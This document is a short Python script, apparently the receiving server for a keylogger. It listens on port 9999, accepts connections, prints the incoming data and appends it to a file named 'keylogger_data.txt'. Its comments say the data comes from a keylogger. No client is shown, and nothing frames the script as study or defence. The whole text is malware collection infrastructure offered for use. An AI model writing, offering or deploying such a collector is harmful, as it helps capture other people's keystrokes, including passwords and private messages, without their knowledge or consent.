import socket

# Set up the server to listen for incoming connections
SERVER_IP = '0.0.0.0'  # Listen on all available interfaces
SERVER_PORT = 9999

log_file = "keylogger_data.txt"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    s.listen(5)
    print(f"Server listening on {SERVER_IP}:{SERVER_PORT}...")

    while True:
        conn, addr = s.accept()
        with conn:
            print(f"Connection from {addr}")
            data = conn.recv(1024).decode()  # Receive data from the keylogger
            print(f"Received: {data}")
            
            # Append the received data to the log file
            with open(log_file, "a") as f:
                f.write(data + "\n")
